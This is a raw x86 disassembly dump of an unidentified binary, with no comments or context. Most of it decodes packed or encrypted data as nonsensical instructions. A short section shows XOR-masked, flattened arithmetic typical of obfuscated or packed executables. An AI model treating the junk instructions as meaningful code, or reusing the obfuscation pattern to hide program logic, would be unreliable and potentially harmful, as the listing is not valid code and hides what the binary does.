  421a5b:	mov    DWORD PTR [ebx+0x3ab4f7ca],ebp
  421a61:	cmp    BYTE PTR [ecx+0x61],dh
  421a64:	das    
  421a65:	inc    esp
  421a66:	test   eax,0xeaee3d37
  421a6b:	in     eax,0x48
  421a6d:	inc    edx
  421a6e:	xchg   BYTE PTR [esi+0x7598365d],dl
  421a74:	ss mov bl,0xe8
  421a78:	lahf   
  421a79:	sub    bl,cl
  421a7b:	fisttp QWORD PTR [ebp-0x16269117]
  421a81:	out    0xdc,al
  421a83:	ret    0x70a6
  421a86:	cmp    eax,0xc0282cfb
  421a8b:	dec    esp
  421a8c:	mov    ebp,0x362213b2
  421a91:	outs   dx,DWORD PTR ds:[esi]
  421a92:	mov    ebp,0xfc19f1c2
  421a97:	sub    BYTE PTR cs:[ebp+0x59aeac92],cl
  421a9e:	cmp    al,0xe9
  421aa0:	lahf   
  421aa1:	fisttp QWORD PTR [ecx+0x8d604ea]
  421aa7:	push   ebp
  421aa8:	mov    eax,ebx
  421aaa:	mov    cl,0x4
  421aac:	and    bh,ah
  421aae:	cwde   
  421aaf:	xor    DWORD PTR [edx],esp
  421ab1:	call   DWORD PTR [eax+0xc]
  421ab4:	stos   BYTE PTR es:[edi],al
  421ab5:	(bad)  
  421ab6:	ror    DWORD PTR [ecx-0xed2de46],cl
  421abc:	test   eax,0x5d2b5058
  421ac1:	mul    DWORD PTR [ebx+0x50]
  421ac4:	pop    ss
  421ac5:	adc    esp,DWORD PTR [eax+0x4a]
  421ac8:	dec    ebx
  421ac9:	sbb    DWORD PTR [esi+0x77],esp
  421acc:	loop   0x421b41
  421ace:	and    al,0x9b
  421ad0:	addr16 adc ebp,esi
  421ad3:	pop    ds
  421ad4:	stos   BYTE PTR es:[edi],al
  421ad5:	push   es
  421ad6:	cwde   
  421ad7:	push   ecx
  421ad8:	leave  
  421ad9:	test   al,0xd2
  421adb:	cmp    edi,ebx
  421add:	nop
  421ade:	icebp  
  421adf:	(bad)  
  421ae0:	sti    
  421ae1:	dec    esi
  421ae2:	mov    bh,0xd2
  421ae4:	leave  
  421ae5:	pushf  
  421ae6:	aaa    
  421ae7:	test   DWORD PTR [ecx+0x30],0x5e9e3456
  421aee:	ret    0xd64a
  421af1:	lock mov WORD PTR fs:[esi+ecx*8+0x7bb22436],ss
  421afa:	mov    ebp,0x2c56c4bc
  421aff:	xchg   ebp,eax
  421b00:	neg    esp
  421b02:	pop    ebx
  421b03:	retf   0x810e
  421b06:	jb     0x421b6c
  421b08:	dec    eax
  421b09:	jecxz  0x421a9b
  421b0b:	inc    edx
  421b0c:	jne    0x421abd
  421b0e:	(bad)  
  421b0f:	rcr    DWORD PTR [ebx-0x31],cl
  421b12:	sbb    ecx,eax
  421b14:	xlat   BYTE PTR ds:[ebx]
  421b16:	pusha  
  421b17:	xlat   BYTE PTR ds:[ebx]
  421b18:	jno    0x421b7e
  421b1a:	cmp    BYTE PTR [ecx],0xfb
  421b1d:	outs   dx,DWORD PTR ds:[esi]
  421b1e:	cmc    
  421b1f:	or     ebp,eax
  421b21:	inc    esp
  421b22:	push   ebx
  421b23:	fiadd  DWORD PTR [esi]
  421b25:	pop    DWORD PTR ds:0x2ee2a3e9
  421b2b:	jne    0x421ab9
  421b2d:	addr16 ds pop edi
  421b30:	icebp  
  421b31:	in     al,dx
  421b32:	cmp    bh,BYTE PTR [ecx+eiz*1-0x1d]
  421b36:	mov    dx,WORD PTR [edx+esi*4+0x58a984a4]
  421b3e:	clc    
  421b3f:	inc    esp
  421b40:	jmp    FWORD PTR [esi]
  421b42:	push   0xf63fdd19
  421b47:	push   edi
  421b48:	push   0x63984b98
  421b4d:	js     0x421adf
  421b4f:	(bad)  
  421b50:	ins    DWORD PTR es:[edi],dx
  421b51:	mov    edi,0x1e7fe257
  421b56:	ins    BYTE PTR es:[edi],dx
  421b57:	cmp    BYTE PTR [eax+0x5],bh
  421b5a:	or     BYTE PTR [ebp+0x51],ch
  421b5d:	sti    
  421b5e:	or     al,dh
  421b60:	xor    esi,edi
  421b62:	pop    esp
  421b63:	mov    cl,0xfe
  421b65:	pushf  
  421b66:	push   ebx
  421b67:	pop    es
  421b68:	push   cs
  421b69:	and    edi,ebx
  421b6b:	test   al,0xb8
  421b6d:	mov    edi,0x4b65e4d2
  421b72:	add    DWORD PTR [ebp-0x52],edi
  421b75:	sahf   
  421b76:	imul   al
  421b78:	lods   eax,DWORD PTR ds:[esi]
  421b79:	pop    ecx
  421b7a:	mov    esi,0x3afb9633
  421b7f:	imul   ebx,DWORD PTR [esi-0x7be2db3e],0x21
  421b86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b87:	cmp    dh,BYTE PTR [ebp-0x4fdbde8]
  421b8d:	fimul  DWORD PTR [edx-0x47]
  421b90:	fs pop si
  421b93:	adc    dl,BYTE PTR [ebx+0x2b1e1fad]
  421b99:	cmp    BYTE PTR [ecx-0x5a],ah
  421b9c:	pop    es
  421b9d:	es call 0x761c:0x2a59385a
  421ba5:	mov    bh,0x83
  421ba7:	call   0x2fef3e8e
  421bac:	sar    bl,0x98
  421baf:	mov    dh,0xb5
  421bb1:	push   esi
  421bb2:	hlt    
  421bb3:	in     al,dx
  421bb4:	dec    edi
  421bb5:	xchg   ebx,eax
  421bb6:	int3   
  421bb7:	lock data16 stos BYTE PTR es:[edi],al
  421bba:	(bad)  
  421bbb:	enter  0xc475,0x37
  421bbf:	and    eax,edi
  421bc1:	fwait
  421bc2:	mov    ds:0x73fcd046,eax
  421bc7:	ds je  0x421b9c
  421bca:	lods   al,BYTE PTR ds:[esi]
  421bcb:	mov    edx,0x4c0b3c6c
  421bd0:	into   
  421bd1:	pushf  
  421bd2:	jo     0x421bdc
  421bd4:	loopne 0x421c37
  421bd6:	push   es
  421bd7:	cwde   
  421bd8:	and    BYTE PTR [ebx+0x6c],ch
  421bdb:	push   ax
  421bdd:	(bad)  
  421bdf:	jae    0x421bef
  421be1:	cli    
  421be2:	mov    ?,WORD PTR [esi+0x7b]
  421be5:	out    dx,eax
  421be6:	pop    esi
  421be7:	mov    ah,0x73
  421be9:	adc    ebp,ebp
  421beb:	daa    
  421bec:	pop    esp
  421bed:	test   DWORD PTR [ebp-0x30ca7d06],edi
  421bf3:	cmp    al,0xec
  421bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf6:	xchg   ebp,eax
  421bf7:	adc    DWORD PTR [eax-0x2bbb3dcc],esi
  421bfd:	jecxz  0x421bca
  421bff:	jno    0x421c54
  421c01:	fild   WORD PTR ds:0x71f42c9f
  421c07:	std    
  421c08:	js     0x421c89
  421c0a:	sbb    cl,bl
  421c0c:	rcl    BYTE PTR [esi+0x30],0xb
  421c10:	lahf   
  421c11:	jns    0x421bd2
  421c13:	xchg   edi,eax
  421c14:	cmc    
  421c15:	fstp   st(7)
  421c17:	inc    ebx
  421c18:	call   DWORD PTR [eax+edi*4]
  421c1b:	xchg   edi,eax
  421c1c:	pop    ebx
  421c1d:	stos   BYTE PTR es:[edi],al
  421c1e:	jne    0x421c93
  421c20:	cdq    
  421c21:	imul   DWORD PTR [esp+ebp*1+0x67]
  421c25:	scas   eax,DWORD PTR es:[edi]
  421c26:	int    0x87
  421c28:	cmp    DWORD PTR [esi-0x22468953],edx
  421c2e:	pop    ds
  421c2f:	add    eax,0xb79e9b4e
  421c34:	nop
  421c35:	mov    ah,0xff
  421c37:	call   0x450427b2
  421c3c:	cmp    bl,BYTE PTR [esi-0x2f]
  421c3f:	sbb    BYTE PTR [esi-0x48f4a9b9],bl
  421c45:	into   
  421c46:	cwde   
  421c47:	iret   
  421c48:	shl    BYTE PTR [edx-0x27ba9ef8],cl
  421c4e:	adc    eax,0xebab62a9
  421c53:	xor    al,cl
  421c55:	cmp    al,0x32
  421c57:	int3   
  421c58:	arpl   di,dx
  421c5a:	dec    ebx
  421c5b:	scas   al,BYTE PTR es:[edi]
  421c5c:	popa   
  421c5d:	in     eax,0xa4
  421c5f:	imul   eax,DWORD PTR [ecx],0xfffffffe
  421c62:	mov    bh,0xc5
  421c64:	cwde   
  421c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c66:	dec    esp
  421c67:	test   DWORD PTR [edi+0x0],esi
  421c6a:	or     BYTE PTR [edi+0x65053bdb],bl
  421c70:	aam    0x27
  421c72:	call   0xa2f8:0x871cd13e
  421c79:	mov    edi,0xbe41fca4
  421c7e:	fxch   st(0)
  421c80:	out    0xa,al
  421c82:	imul   ebx
  421c84:	add    ah,ch
  421c86:	push   eax
  421c87:	adc    BYTE PTR [ebp+0x1fbb47ba],cl
  421c8d:	jnp    0x421ce2
  421c8f:	ret    0xc2e0
  421c92:	dec    eax
  421c93:	inc    esi
  421c94:	mov    ch,0x90
  421c96:	add    edi,eax
  421c98:	xchg   edi,eax
  421c99:	xchg   ebx,eax
  421c9a:	push   es
  421c9b:	add    al,0x86
  421c9d:	pop    ecx
  421c9e:	lods   eax,DWORD PTR ds:[esi]
  421c9f:	jg     0x421d0a
  421ca1:	imul   esp,DWORD PTR [edi-0x1b],0x58133be3
  421ca8:	dec    edi
  421ca9:	jg     0x421ce9
  421cab:	rol    DWORD PTR [ebp+ebx*1+0x74c6ef43],1
  421cb2:	rcr    DWORD PTR [esi],cl
  421cb4:	and    eax,0x807856ea
  421cb9:	nop
  421cba:	cs fucom st(5)
  421cbd:	xor    DWORD PTR [ecx+0x165d8ae7],ebx
  421cc3:	xchg   edx,ecx
  421cc5:	mov    dh,0x25
  421cc7:	sbb    bh,dl
  421cc9:	leave  
  421cca:	test   BYTE PTR [edi+ebp*8+0x40],dl
  421cce:	hlt    
  421ccf:	sbb    bl,bh
  421cd1:	mov    ebx,0xda70d024
  421cd6:	pop    esi
  421cd7:	jecxz  0x421d3c
  421cd9:	mov    WORD PTR [edi+0x66de750e],?
  421cdf:	jne    0x421c9c
  421ce1:	xor    DWORD PTR [eax+0xc],ebx
  421ce4:	jp     0x421d55
  421ce6:	push   ds
  421ce7:	cmpxchg ecx,esi
  421cea:	inc    ebp
  421ceb:	mov    edx,eax
  421ced:	jecxz  0x421ca3
  421cef:	mul    DWORD PTR [eax-0x63]
  421cf2:	ret    
  421cf3:	call   0xab2b:0x55c834c8
  421cfa:	xor    cl,BYTE PTR [edi+0x12]
  421cfd:	adc    dh,BYTE PTR [eax+0x7c]
  421d00:	clc    
  421d01:	sub    al,0x74
  421d03:	test   eax,0x58f72b5c
  421d08:	inc    esp
  421d09:	out    dx,al
  421d0a:	sub    edi,edx
  421d0c:	(bad)  
  421d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d0e:	cmp    al,0xbb
  421d10:	jmp    0x9d6:0x55521c89
  421d17:	in     ax,dx
  421d19:	retf   
  421d1a:	aas    
  421d1b:	fild   DWORD PTR [ebx-0x36]
  421d1e:	fchs   
  421d20:	xchg   esi,eax
  421d21:	lahf   
  421d22:	fnsave [edx]
  421d24:	int    0xc2
  421d26:	aas    
  421d27:	jg     0x421cc8
  421d29:	jb     0x421cec
  421d2b:	jbe    0x421d30
  421d2d:	mov    edx,0x47dee9ed
  421d32:	mov    eax,0x74494d73
  421d37:	sub    eax,0xe00bf5fa
  421d3c:	sub    ah,al
  421d3e:	jmp    0x421cce
  421d40:	sbb    bl,cl
  421d42:	sub    bh,BYTE PTR [eax-0x4c]
  421d45:	shl    BYTE PTR [esi+0x33],cl
  421d48:	mov    BYTE PTR [edx+0x51],0x6f
  421d4c:	inc    edi
  421d4d:	jmp    0x110b:0x29a8e797
  421d54:	fs xchg edx,eax
  421d56:	jmp    0x421cf3
  421d58:	xor    DWORD PTR [ecx],ebp
  421d5a:	jecxz  0x421d5b
  421d5c:	sti    
  421d5d:	xor    dh,cl
  421d5f:	fidivr WORD PTR [ebx-0x7afdcb89]
  421d65:	adc    eax,0xa4aca305
  421d6a:	sub    al,0x8b
  421d6c:	lods   al,BYTE PTR ds:[esi]
  421d6d:	inc    ebx
  421d6e:	aaa    
  421d6f:	gs mov ch,0x7f
  421d72:	out    dx,eax
  421d73:	cli    
  421d74:	inc    esp
  421d75:	out    0xff,eax
  421d77:	test   DWORD PTR [eax+0x3759c941],ebp
  421d7d:	sub    eax,0x7eb9aaee
  421d82:	(bad)  
  421d83:	rcl    BYTE PTR [ebx-0x5a],cl
  421d86:	sub    eax,0xabe99c34
  421d8b:	xor    esp,DWORD PTR [ebx-0x32]
  421d8e:	fistp  QWORD PTR [edx+0x6345a4fa]
  421d94:	outs   dx,BYTE PTR ds:[esi]
  421d95:	test   al,0x8b
  421d97:	sub    al,0x92
  421d99:	pop    esp
  421d9a:	add    al,0xf7
  421d9c:	es sub DWORD PTR fs:[edi],ebx
  421da0:	enter  0xc76e,0x19
  421da4:	jnp    0x421de7
  421da6:	lods   al,BYTE PTR ds:[esi]
  421da7:	in     al,dx
  421da8:	cwde   
  421da9:	call   FWORD PTR [esi+eax*1-0x51]
  421dad:	ins    DWORD PTR es:[edi],dx
  421dae:	inc    eax
  421daf:	add    ebp,DWORD PTR [edx+ecx*8]
  421db2:	fiadd  DWORD PTR [ecx]
  421db4:	fistp  QWORD PTR [esi+0x6b]
  421db7:	and    ch,BYTE PTR [ebx+0x4492de70]
  421dbd:	mov    ss,WORD PTR [esi+0x23d8b48f]
  421dc3:	pop    esi
  421dc4:	sbb    eax,DWORD PTR [edi+0x4]
  421dc7:	ret    
  421dc8:	fbstp  TBYTE PTR [ecx-0x717bfbd8]
  421dce:	call   0x8f30:0x690097af
  421dd5:	js     0x421dbf
  421dd7:	mov    edx,0x88d18d9e
  421ddc:	jae    0x421d96
  421dde:	and    BYTE PTR [ecx],dh
  421de0:	clc    
  421de1:	sbb    al,0x42
  421de3:	inc    eax
  421de4:	fld    QWORD PTR [eax+0x16]
  421de7:	mov    bl,0xf6
  421de9:	sbb    DWORD PTR [eax+eax*1-0x18],ecx
  421ded:	pusha  
  421dee:	inc    edx
  421def:	sar    DWORD PTR [edi-0xd],cl
  421df2:	mov    ds:0x77f3b4d,eax
  421df7:	pop    edx
  421df8:	mov    edi,0x358b84ef
  421dfd:	adc    eax,DWORD PTR [eax-0x2d]
  421e00:	jle    0x421e5d
  421e02:	stc    
  421e03:	(bad)  
  421e04:	loopne 0x421de9
  421e06:	add    eax,0xd855c915
  421e0b:	idiv   ch
  421e0d:	push   0x30de15c2
  421e12:	mov    ds:0xbd55481b,eax
  421e17:	into   
  421e18:	mov    al,ds:0xe794451b
  421e1d:	data16 mov bl,0x4d
  421e20:	in     al,0x50
  421e22:	pop    ds
  421e23:	gs js  0x421e13
  421e26:	daa    
  421e27:	inc    ebp
  421e28:	or     ch,bh
  421e2a:	push   edx
  421e2b:	push   0x53
  421e2d:	fs inc ebx
  421e2f:	daa    
  421e30:	sbb    eax,0xec16bcce
  421e35:	mov    ecx,0xf62ffc39
  421e3a:	xor    BYTE PTR [ecx+0x32],bh
  421e3d:	es bnd jge 0x421e28
  421e41:	mov    edi,0xdfaf59ed
  421e47:	(bad)  
  421e48:	arpl   WORD PTR [esi+0x558939a5],ax
  421e4e:	hlt    
  421e4f:	mov    edx,DWORD PTR [ebp-0x10]
  421e52:	xor    edx,eax
  421e54:	add    edx,esi
  421e56:	jne    0x41d43b
  421e5c:	jmp    0x422f89
  421e61:	mov    ecx,DWORD PTR [ebp-0x14]
  421e64:	mov    DWORD PTR [ebp+0x8],ecx
  421e67:	jmp    0x421ee0
  421e6c:	mov    ecx,DWORD PTR [ebp+0x8]
  421e6f:	mov    edx,DWORD PTR [ebp-0x8]
  421e72:	xor    ecx,eax
  421e74:	xor    edx,eax
  421e76:	sub    ecx,edx
  421e78:	sub    ecx,esi
  421e7a:	xor    ecx,eax
  421e7c:	mov    DWORD PTR [ebp+0x8],ecx
  421e7f:	mov    ecx,DWORD PTR [ebp+0x8]
  421e82:	mov    edx,DWORD PTR [ebp-0x58]
  421e85:	add    ecx,0x5708fa
  421e8b:	imul   ecx,edx
  421e8e:	mov    DWORD PTR [ebp-0x58],ecx
  421e91:	mov    ecx,DWORD PTR [ebp+0x8]
  421e94:	mov    edx,DWORD PTR [ebp-0x54]
  421e97:	add    ecx,0x64f898
  421e9d:	or     ecx,edx
  421e9f:	mov    DWORD PTR [ebp-0x54],ecx
  421ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ea5:	mov    edx,DWORD PTR [ebp-0x50]
  421ea8:	add    ecx,0x242ebc9
  421eae:	xor    ecx,edx
  421eb0:	mov    DWORD PTR [ebp-0x50],ecx
  421eb3:	mov    ecx,DWORD PTR [ebp+0x8]
  421eb6:	mov    edx,DWORD PTR [ebp-0x4c]
  421eb9:	add    ecx,edi
  421ebb:	and    ecx,edx
  421ebd:	mov    DWORD PTR [ebp-0x4c],ecx
  421ec0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ec3:	mov    edx,DWORD PTR [ebp-0x48]
  421ec6:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421ecd:	mov    DWORD PTR [ebp-0x48],ecx
  421ed0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ed3:	mov    edx,0xfa5e1524
  421ed8:	sub    edx,ecx
  421eda:	add    edx,DWORD PTR [ebp-0x44]
  421edd:	mov    DWORD PTR [ebp-0x44],edx
  421ee0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ee3:	xor    ecx,eax
  421ee5:	add    ecx,esi
  421ee7:	jne    0x421e6c
  421eed:	jmp    0x422f95
  421ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ef5:	mov    edx,DWORD PTR [ebp-0x8]
  421ef8:	xor    ecx,eax
  421efa:	xor    edx,eax
  421efc:	sub    ecx,edx
  421efe:	sub    ecx,esi
  421f00:	xor    ecx,eax
  421f02:	mov    DWORD PTR [ebp+0x8],ecx
  421f05:	mov    ecx,DWORD PTR [ebp+0x8]
  421f08:	mov    edx,DWORD PTR [ebp-0x58]
  421f0b:	add    ecx,0x5708fa
  421f11:	imul   ecx,edx
  421f14:	mov    DWORD PTR [ebp-0x58],ecx
  421f17:	mov    ecx,DWORD PTR [ebp+0x8]
  421f1a:	mov    edx,DWORD PTR [ebp-0x54]
  421f1d:	add    ecx,0x64f898
  421f23:	or     ecx,edx
  421f25:	mov    DWORD PTR [ebp-0x54],ecx
  421f28:	mov    ecx,DWORD PTR [ebp+0x8]
  421f2b:	mov    edx,DWORD PTR [ebp-0x50]
  421f2e:	add    ecx,0x242ebc9
  421f34:	xor    ecx,edx
  421f36:	mov    DWORD PTR [ebp-0x50],ecx
  421f39:	mov    ecx,DWORD PTR [ebp+0x8]
  421f3c:	mov    edx,DWORD PTR [ebp-0x4c]
  421f3f:	jmp    0x422f55
  421f44:	sbb    eax,0x95d463fb
  421f49:	aam    0x96
  421f4b:	mov    dh,0xbf
  421f4d:	cdq    
  421f4e:	push   eax
  421f4f:	inc    esi
  421f50:	sbb    DWORD PTR [edx+0x6a],ebx
  421f53:	cwde   
  421f54:	fist   DWORD PTR [ecx+0x7284837c]
  421f5a:	add    DWORD PTR [ebx+0x1e98409],0xffffffe5
  421f61:	popf   
  421f62:	and    ch,al
  421f64:	fstp   TBYTE PTR [eax+0xd]
  421f67:	jl     0x421f4f
  421f69:	int3   
  421f6a:	aad    0x2e
  421f6c:	into   
  421f6d:	jae    0x421fbd
  421f6f:	mov    dh,0x5
  421f71:	lea    edi,[edi+0x44]
  421f74:	cmp    esp,edi
  421f76:	and    DWORD PTR [esi+esi*1],edi
  421f79:	cmp    dh,BYTE PTR [eax+ebx*1+0x67a2e825]
  421f80:	bound  edx,QWORD PTR [edi]
  421f82:	rcr    DWORD PTR [esi+eiz*4+0xb],1
  421f86:	test   al,0x1f
  421f88:	iret   
  421f89:	je     0x421f5a
  421f8b:	xchg   ebp,eax
  421f8c:	or     dl,BYTE PTR [eax+eiz*1-0x11a1c2dd]
  421f93:	xor    edx,edi
  421f95:	ror    DWORD PTR [ebx],0x19
  421f98:	mov    ch,0x2e
  421f9a:	dec    esi
  421f9b:	je     0x421ff5
  421f9d:	out    0xcd,eax
  421f9f:	aaa    
  421fa0:	pop    edi
  421fa1:	pop    ds
  421fa2:	stos   BYTE PTR es:[edi],al
  421fa3:	xchg   DWORD PTR [ebp+0x8f46f20],edi
  421fa9:	dec    edi
  421faa:	(bad)  
  421fab:	cli    
  421fac:	push   esi
  421fad:	mov    BYTE PTR [ebx],dl
  421faf:	pusha  
  421fb0:	mov    ch,0x31
  421fb2:	clc    
  421fb3:	or     edi,esp
  421fb5:	sub    ebx,ebp
  421fb7:	js     0x422021
  421fb9:	inc    edx
  421fba:	xchg   ebx,eax
  421fbb:	or     edi,DWORD PTR [esi]
  421fbd:	and    DWORD PTR [edx],edx
  421fbf:	and    eax,ebx
  421fc1:	pusha  
  421fc2:	push   ecx
  421fc3:	rcl    DWORD PTR [edi+0x70504d52],cl
  421fc9:	sub    edx,DWORD PTR [eax+0x2b]
  421fcc:	int3   
  421fcd:	pmuludq mm1,QWORD PTR [eax-0x43]
  421fd1:	cwde   
  421fd2:	mov    esi,esi
  421fd4:	adc    ebx,ebp
  421fd6:	adc    eax,0x54375aa2
  421fdb:	xchg   edx,eax
  421fdc:	xchg   ebx,eax
  421fdd:	clc    
  421fde:	iret   
  421fdf:	ins    BYTE PTR es:[edi],dx
  421fe0:	push   cs
  421fe1:	xor    cl,al
  421fe3:	sar    ecx,1
  421fe5:	push   ebx
  421fe6:	mov    ah,0xdb
  421fe8:	push   ds
  421fe9:	and    al,bl
  421feb:	or     bh,BYTE PTR [edi]
  421fed:	in     al,dx
  421fee:	or     DWORD PTR [edx],edx
  421ff0:	mov    dl,0x2e
  421ff2:	je     0x422060
  421ff4:	rol    ebp,cl
  421ff6:	mov    dh,ah
  421ff8:	inc    edx
  421ff9:	push   es
  421ffa:	inc    esp
  421ffb:	arpl   WORD PTR [edi+eax*8-0x47d2b218],bx
  422002:	mov    bh,0x4d
  422004:	xor    BYTE PTR ds:0x520d010f,0x89
  42200b:	outs   dx,BYTE PTR ds:[esi]
  42200c:	out    dx,al
  42200d:	fdivr  QWORD PTR [edi-0x18a79d7f]
  422013:	call   0xaab6897a
  422018:	mov    DWORD PTR [edi],esp
  42201a:	pop    ss
  42201b:	dec    ebp
  42201c:	add    cl,0x4b
  42201f:	xor    al,0xd9
  422022:	in     eax,0x93
  422024:	or     al,0x23
  422026:	fcom   DWORD PTR [ebx+0x6e]
  422029:	or     DWORD PTR [eax],ebx
  42202b:	mov    BYTE PTR [eax],ah
  42202d:	ds mov ebp,0x3f2df986
  422033:	repz cmp DWORD PTR [ebx],esp
  422036:	aaa    
  422037:	mov    ebx,0x59f340e1
  42203c:	inc    ecx
  42203d:	push   ss
  42203e:	pop    eax
  42203f:	jmp    0x42206d
  422041:	inc    ebx
  422042:	pop    ebx
  422043:	psubsb mm2,QWORD PTR [esi+ebx*1-0x768e0a99]
  42204b:	and    esp,DWORD PTR gs:[esi]
  42204e:	pop    esp
  42204f:	out    dx,eax
  422050:	test   BYTE PTR [edx],0x86
  422053:	and    ecx,DWORD PTR ds:0x44377fee
  422059:	inc    ebx
  42205a:	xor    al,0xc2
  42205c:	push   eax
  42205d:	cld    
  42205e:	dec    ebp
  42205f:	mov    ebp,DWORD PTR [ebp+0x40]
  422062:	scas   al,BYTE PTR es:[edi]
  422063:	and    al,0x99
  422065:	xor    eax,0x751d735a
  42206a:	clc    
  42206b:	pop    edi
  42206c:	push   0xffffffe7
  42206e:	xor    ah,0xec
  422071:	aaa    
  422072:	and    ebp,DWORD PTR [ecx]
  422074:	mov    ah,0x2f
  422076:	inc    eax
  422077:	outs   dx,DWORD PTR ds:[esi]
  422078:	cmp    ch,BYTE PTR [edi-0x302d237c]
  42207e:	pop    edx
  42207f:	stos   BYTE PTR es:[edi],al
  422080:	imul   esp,DWORD PTR ds:0xb593fd0f,0xffffffb7
  422087:	push   esp
  422088:	xchg   ecx,eax
  422089:	(bad)  
  42208a:	fs xchg edi,eax
  42208c:	push   eax
  42208d:	mov    fs,WORD PTR [edx+0x45]
  422090:	ins    BYTE PTR es:[edi],dx
  422091:	xchg   edi,eax
  422092:	in     eax,dx
  422093:	sub    eax,0x4943ac4e
  422098:	sub    dh,BYTE PTR [ebx+0x5b]
  42209b:	inc    ebp
  42209c:	push   eax
  42209d:	ins    BYTE PTR es:[edi],dx
  42209e:	inc    ebp
  42209f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220a0:	iret   
  4220a1:	fadd   QWORD PTR [edi-0x2c]
  4220a4:	push   eax
  4220a5:	(bad)  
  4220a6:	into   
  4220a7:	lea    ebp,[edx]
  4220a9:	jb     0x4220ee
  4220ab:	lods   eax,DWORD PTR ds:[esi]
  4220ac:	outs   dx,BYTE PTR ds:[esi]
  4220ad:	pop    es
  4220ae:	fist   DWORD PTR [ebp+0x62dbab84]
  4220b4:	(bad)  
  4220b5:	dec    ebx
  4220b6:	lods   eax,DWORD PTR ds:[esi]
  4220b7:	hlt    
  4220b8:	mov    al,ds:0x7aa89c2d
  4220bd:	(bad)  
  4220be:	dec    BYTE PTR [eax+0x1ed6dead]
  4220c4:	xor    bl,BYTE PTR [eax]
  4220c6:	out    0x70,al
  4220c8:	div    DWORD PTR [esi]
  4220ca:	test   DWORD PTR [ecx],0x9a457546
  4220d0:	sahf   
  4220d1:	hlt    
  4220d2:	cs mov ch,0x3e
  4220d5:	jp     0x422092
  4220d7:	dec    edx
  4220d8:	sbb    ah,BYTE PTR [ecx-0x69af2027]
  4220de:	dec    ecx
  4220df:	xlat   BYTE PTR ds:[ebx]
  4220e0:	imul   edx,DWORD PTR [ecx],0x9d1ea576
  4220e6:	or     BYTE PTR [esi],dl
  4220e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e9:	cmp    eax,0x9c895551
  4220ee:	adc    eax,0x9f0e22dc
  4220f3:	inc    eax
  4220f4:	xor    al,0x90
  4220f6:	scas   al,BYTE PTR es:[edi]
  4220f7:	adc    al,0x11
  4220f9:	cmp    DWORD PTR [esi-0x1f],ebx
  4220fc:	addr16 in eax,0xae
  4220ff:	repz xchg esp,eax
  422101:	bound  edx,QWORD PTR [esi-0x8494823]
  422107:	stos   BYTE PTR es:[edi],al
  422108:	or     eax,ecx
  42210a:	mov    esi,0x70a3c6c3
  42210f:	ret    
  422110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422111:	add    eax,0x24076da5
  422116:	jle    0x4220a4
  422118:	pop    esp
  422119:	push   ebp
  42211a:	sub    DWORD PTR [edx],eax
  42211c:	jp     0x422123
  42211e:	dec    esi
  42211f:	jl     0x42216d
  422121:	push   ecx
  422122:	inc    ebp
  422123:	dec    esp
  422124:	icebp  
  422125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422126:	sbb    bh,BYTE PTR ds:0x4ae72f21
  42212c:	cmp    eax,0xeaa17045
  422131:	cwde   
  422132:	mov    esi,esi
  422134:	loop   0x42212c
  422136:	pop    ebp
  422137:	stc    
  422138:	jo     0x422100
  42213a:	shl    DWORD PTR ds:0x719e3180,1
  422140:	sbb    dh,BYTE PTR [ebp+0x30]
  422143:	sub    ch,BYTE PTR [esi+0x26]
  422146:	or     eax,0xaeac9fbd
  42214b:	xchg   edx,eax
  42214c:	paddb  mm4,QWORD PTR [edx-0x12a0e572]
  422153:	test   BYTE PTR [ebp-0x77b5fb97],dh
  422159:	sar    BYTE PTR [ebx],cl
  42215b:	and    DWORD PTR [ecx+0x1368180d],ebp
  422161:	lock mov ebp,0x1494b051
  422167:	(bad)  
  42216a:	xor    dh,BYTE PTR [ebx]
  42216c:	xchg   edx,eax
  42216d:	xchg   esi,eax
  42216e:	sub    ecx,DWORD PTR gs:[ebx+ecx*8]
  422172:	adc    eax,0xe7d0cd67
  422177:	push   ebx
  422178:	mov    bh,0x1a
  42217a:	jb     0x422158
  42217c:	or     eax,0x2f5254b7
  422181:	or     ah,BYTE PTR [ebp+0x77]
  422184:	pop    eax
  422185:	iret   
  422186:	(bad)  
  422188:	lea    eax,[ecx-0x4c]
  42218b:	inc    eax
  42218c:	fistp  QWORD PTR [edx-0x18]
  42218f:	jns    0x42218f
  422191:	jg     0x42211f
  422193:	in     eax,0x77
  422195:	aam    0x50
  422197:	hlt    
  422198:	push   ebp
  422199:	inc    ecx
  42219a:	adc    cl,dl
  42219c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42219d:	xor    bh,0xc7
  4221a0:	outs   dx,BYTE PTR ds:[esi]
  4221a1:	push   ecx
  4221a2:	out    0xa3,eax
  4221a4:	add    edx,DWORD PTR [eax+eax*1+0x24]
  4221a8:	adc    ah,dh
  4221aa:	xor    al,0xad
  4221ac:	jg     0x422153
  4221ae:	clc    
  4221af:	xor    al,0x72
  4221b1:	xchg   BYTE PTR [ebp+0x2f8cb387],bl
  4221b7:	inc    edi
  4221b8:	nop
  4221b9:	pop    ss
  4221ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221bb:	mov    eax,ds:0xbfb6d1ea
  4221c0:	retf   
  4221c1:	jno    0x42219b
  4221c3:	or     BYTE PTR [edi],bh
  4221c5:	in     eax,0xdc
  4221c7:	xchg   ecx,eax
  4221c8:	out    0x2f,eax
  4221ca:	xor    esp,DWORD PTR [ebx-0x6908f6e8]
  4221d0:	icebp  
  4221d1:	test   ch,ah
  4221d3:	mov    al,ds:0x9e29f432
  4221d8:	push   ss
  4221d9:	das    
  4221da:	outs   dx,DWORD PTR ds:[esi]
  4221db:	mov    ebx,0x1c78eeb4
  4221e0:	adc    ecx,esp
  4221e2:	fsubr  DWORD PTR [eax+0x3e52e2fd]
  4221e8:	mov    ebx,0x2f0ca768
